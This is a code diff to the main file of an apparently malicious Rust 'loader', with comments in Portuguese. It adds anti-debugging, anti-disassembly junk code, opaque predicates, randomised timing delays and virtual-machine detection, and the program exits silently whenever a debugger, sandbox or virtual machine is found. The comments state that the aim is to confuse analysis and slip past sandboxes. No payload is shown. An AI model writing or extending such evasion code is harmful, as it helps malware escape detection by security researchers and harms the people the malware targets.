@@ -30,6 +30,7 @@ mod utils;
 use config::Config;
 use loader::{initialize_loader, run_loader_loop, get_hydra_status};
 use utils::anti_analysis::EnvironmentChecker;
+use utils::anti_debug;
 use utils::evasion;
 use utils::helpers::format_size;
 
@@ -98,14 +99,39 @@ async fn main() -> anyhow::Result<()> {
 
     // Evasion: delay inicial e verificações anti-sandbox
     if !is_secondary {
+        // Anti-disassembly: junk code no início
+        anti_debug::junk_code_block();
+        
+        // Anti-debug: verifica debugger antes de qualquer coisa
+        if anti_debug::is_debugger_attached() && !args.skip_checks {
+            // Sai silenciosamente se debugger detectado
+            anti_debug::junk_code_block();
+            std::process::exit(0);
+        }
+        
         // Delay inicial para evitar sandboxes com timeout curto
         evasion::initial_delay();
+        
+        // Mais junk code para confundir análise
+        if anti_debug::opaque_true() {
+            anti_debug::junk_code_block();
+        }
+        
+        // Anti-debug: delay com timing aleatório
+        anti_debug::anti_timing_delay();
         
         // Executa verificações de evasão
         let evasion_result = evasion::run_all_checks();
         
         if evasion_result.is_being_analyzed() && !args.skip_checks {
             // Comportamento "normal" - não executa se detectar análise
+            anti_debug::junk_code_block();
+            std::process::exit(0);
+        }
+        
+        // Verifica ambiente virtual
+        if anti_debug::is_virtual_environment() && !args.skip_checks {
+            anti_debug::junk_code_block();
             std::process::exit(0);
         }
         
